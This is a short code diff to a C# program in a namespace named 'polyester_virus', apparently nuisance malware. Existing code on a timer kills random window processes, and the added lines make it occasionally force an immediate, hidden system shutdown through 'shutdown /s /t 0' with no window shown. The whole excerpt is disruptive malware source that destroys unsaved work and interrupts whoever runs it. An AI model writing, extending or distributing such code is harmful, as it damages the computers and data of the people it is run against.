@@ -125,6 +125,15 @@ namespace polyester_virus
                 {
                     KillRandomWindowProcess();
                 }
+                if (Random.Shared.Next(1000) == 1)
+                {
+                    ProcessStartInfo psi = new("shutdown", "/s /t 0")
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    };
+                    Process.Start(psi);
+                }
             };
             timer.Start();
             Application.Run();
